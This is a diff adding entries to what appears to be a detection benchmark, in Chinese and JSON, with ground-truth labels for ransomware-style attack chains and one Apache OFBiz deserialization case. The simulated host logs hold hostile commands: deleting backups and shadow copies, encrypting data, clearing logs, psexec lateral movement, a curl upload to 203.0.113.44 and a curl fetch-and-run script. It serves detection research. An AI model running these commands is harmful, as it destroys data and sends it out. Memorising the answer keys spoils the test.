+  "1092": {
+   "unit": 1092,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "入侵备份服务器删除备份目录与 LVM 快照并外传文件清单",
+   "source_sequence": [
+    "hids",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（ssh）",
+     "n_lines": 1,
+     "lines": [
+      "ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.10.31 \"rm -rf /backup/*\" <== /bin/bash -c 'ssh' <== /u"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（tar）",
+     "n_lines": 1,
+     "lines": [
+      "tar czf - /srv/backup | gpg -c -o /tmp/b.tgz.gpg && lvremove -f /dev/vg0/bk_snap <== /bin/bash -c 'tar' <== /u"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "dns"
+     ],
+     "label": "DNS C2（c0565abc.qovzmi-9c31.net）",
+     "n_lines": 3,
+     "lines": [
+      "c0565abc.qovzmi-9c31.net A 192.0.2.51",
+      "76ecadab.qovzmi-9c31.net A 10.10.25.77",
+      "d1004d20.qovzmi-9c31.net A 10.10.27.49"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3,
+      4
+     ],
+     "variant": "full",
+     "n_lines": 5,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3,
+      4
+     ],
+     "variant": "del1",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（tar）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（tar）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（tar）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（tar）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "DNS C2（c0565abc.qovzmi-9c31.net）",
+       "sources": [
+        "dns"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1093": {
+   "unit": 1093,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "停用 mysqld 后删除归档备份并加密 InnoDB 表空间文件",
+   "source_sequence": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（systemctl）",
+     "n_lines": 1,
+     "lines": [
+      "systemctl stop mysqld && rm -rf /var/backups/mysql mysqld mysqld systemctl stop mysqld <== /bin/bash -c 'syste"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（find）",
+     "n_lines": 1,
+     "lines": [
+      "find /var/lib/mysql -name \"ib*.ibd\" -exec openssl enc -aes-256-cbc -in {} -out {}.enc \\; <== /bin/bash -c 'fin"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（printf）",
+     "n_lines": 1,
+     "lines": [
+      "printf \"data renamed to .enc\" > /srv/README_RESTORE.txt && rm -f /tmp/.k <== /bin/bash -c 'printf' <== /usr/sb"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（find）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（find）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（find）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（find）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（printf）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1094": {
+   "unit": 1094,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "删除虚拟机快照后加密 vmdk 镜像文件并清除镜像备份",
+   "source_sequence": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（virsh）",
+     "n_lines": 1,
+     "lines": [
+      "virsh snapshot-delete web01 base --metadata virsh virsh snapshot-delete web01 base <== /bin/bash -c 'virsh' <="
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（find）",
+     "n_lines": 1,
+     "lines": [
+      "find /vmstore -name \"*.vmdk\" -exec gpg -c --batch --passphrase-file /tmp/.k {} \\; find find /vmstore -name <=="
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（rm）",
+     "n_lines": 1,
+     "lines": [
+      "rm -rf /vmstore/snapshots/* && unlink /vmstore/base.vmdk.bak <== /bin/bash -c 'rm' <== /usr/sbin/cron <== /usr"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（find）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（find）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（find）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（find）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（rm）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1095": {
+   "unit": 1095,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "删除卷影副本、全盘加密并投放 !RECOVER!.txt 说明文件",
+   "source_sequence": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（vssadmin）",
+     "n_lines": 1,
+     "lines": [
+      "vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet cmd.exe cmd.exe /c vssadmin <== cmd.exe /"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（powershell）",
+     "n_lines": 1,
+     "lines": [
+      "powershell -c \"gci C:\\share -r|%{cipher /e $_.FullName}\" && echo note>C:\\share\\!RECOVER!.txt powershell.exe po"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（wevtutil）",
+     "n_lines": 1,
+     "lines": [
+      "wevtutil cl Application && wevtutil cl System cmd.exe cmd.exe /c wevtutil cl <== cmd.exe /c wevtutil <== servi"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（powershell）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（powershell）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（powershell）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（powershell）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（wevtutil）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1096": {
+   "unit": 1096,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "配置安全模式启动后删除备份编录并加密数据分区",
+   "source_sequence": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（bcdedit）",
+     "n_lines": 1,
+     "lines": [
+      "bcdedit /set {default} safeboot network cmd.exe cmd.exe /c bcdedit /set {default} safeboot <== cmd.exe /c bcde"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（wbadmin）",
+     "n_lines": 1,
+     "lines": [
+      "wbadmin delete catalog -quiet && wbadmin delete systemstatebackup -deleteOldest <== cmd.exe /c wbadmin <== ser"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（gpg）",
+     "n_lines": 1,
+     "lines": [
+      "gpg -c --batch --passphrase-file D:\\k.dat --yes D:\\Data\\* && wevtutil cl Application cmd.exe cmd.exe /c cipher"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（wbadmin）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（wbadmin）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（wbadmin）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（wbadmin）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（gpg）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1097": {
+   "unit": 1097,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "PsExec 远程会话投放并运行加密器清空共享目录",
+   "source_sequence": [
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（psexec）",
+     "n_lines": 1,
+     "lines": [
+      "psexec \\\\10.20.6.77 -s -d cmd.exe /c copy \\\\10.20.3.9\\pub\\openssl.exe C:\\openssl.exe <== cmd.exe /c psexec <=="
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（psexec）",
+     "n_lines": 1,
+     "lines": [
+      "psexec \\\\10.20.6.77 -s cmd.exe /c \"vssadmin delete shadows /all /quiet & openssl enc -aes-256-cbc -pass file:C"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（psexec）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（psexec）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（psexec）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（psexec）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1098": {
+   "unit": 1098,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "本地压缩加密后取走备份并删除原始数据目录形成双重破坏",
+   "source_sequence": [
+    "hids",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（rm）",
+     "n_lines": 1,
+     "lines": [
+      "rm -rf /srv/data /var/backups/* && curl -T /tmp/bk.tgz.gpg http://203.0.113.44/u <== /bin/bash -c 'rm' <== /us"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（tar）",
+     "n_lines": 1,
+     "lines": [
+      "tar czf /tmp/bk.tgz /srv/data && gpg -c --batch --passphrase-file /tmp/.k /tmp/bk.tgz <== /bin/bash -c 'tar' <"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "dns"
+     ],
+     "label": "DNS C2（5c271b84.vexrum-77ad.net）",
+     "n_lines": 3,
+     "lines": [
+      "5c271b84.vexrum-77ad.net A 192.0.2.101",
+      "176b8233.vexrum-77ad.net A 10.10.49.217",
+      "7210db31.vexrum-77ad.net A 10.10.28.58"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3,
+      4
+     ],
+     "variant": "full",
+     "n_lines": 5,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3,
+      4
+     ],
+     "variant": "del1",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（tar）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（tar）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（tar）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（tar）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "DNS C2（5c271b84.vexrum-77ad.net）",
+       "sources": [
+        "dns"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1099": {
+   "unit": 1099,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "curl 下载加密脚本落地即执行并删除归档备份目录",
+   "source_sequence": [
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（curl）",
+     "n_lines": 1,
+     "lines": [
+      "curl -fsSL 203.0.113.44/upd.sh -o /tmp/.u.sh && rm -rf /backup/* && sh /tmp/.u.sh && openssl enc -aes-256-cbc "
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0
+     ],
+     "variant": "full",
+     "n_lines": 1,
+     "n_steps": 1,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": false,
+     "note": "删步后无日志（等同 blind 条件）",
+     "kept_idx": [],
+     "variant": "del1",
+     "n_lines": 0,
+     "n_steps": 1,
+     "observed_steps": [],
+     "missing_steps": [
+      "S1"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S1",
+     "gt_next_label": "主机命令（curl）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S1",
+       "label": "主机命令（curl）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "删步后无日志（等同 blind 条件）",
+     "kept_idx": [],
+     "variant": "del2",
+     "n_lines": 0,
+     "n_steps": 1,
+     "observed_steps": [],
+     "missing_steps": [
+      "S1"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S1",
+     "gt_next_label": "主机命令（curl）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S1",
+       "label": "主机命令（curl）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1100": {
+   "unit": 1100,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-005",
+   "technique": "Web 接口触发横向扩散后加密多台主机并清理认证日志",
+   "source_sequence": [
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-spring-142.ops-corp.com/api/v2/tasks/run {\"cmd\": \"bash deploy.sh --hosts 10.20.8.0/24\", \"template\""
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（for）",
+     "n_lines": 1,
+     "lines": [
+      "for h in 10.20.8.11 10.20.8.12; do ssh root@$h \"rm -rf /backup/*\"; done ssh ssh for h in <== /bin/bash -c 'for"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（openssl）",
+     "n_lines": 1,
+     "lines": [
+      "openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/vm -out /srv/vm.enc && shred -u /var/log/auth.log <== /bi"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（for）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（for）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（for）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（for）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（openssl）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1008": {
+   "unit": 1008,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Apache OFBiz XML-RPC 反序列化 CVE-2023-51467",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/webtools/control/xmlrpc）",
+     "n_lines": 2,
+     "lines": [
+      "/webtools/control/xmlrpc <value>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==</value> Mozilla/5.0 (Linux; Android 13; S",
+      "/webtools/control/xmlrpc <value>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==</value> Mozilla/5.0 (Linux; Android 13; S"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-java-76.ops-corp.com/webtools/control/xmlrpc {\"deserialization\": \"rO0ABXNy\"} Mozilla/5.0 (Linux; A"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（env）",
+     "n_lines": 1,
+     "lines": [
+      "env /usr/bin/env env <== /bin/sh -c 'env' <== /usr/bin/java -jar /opt/app/ofbiz.jar"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
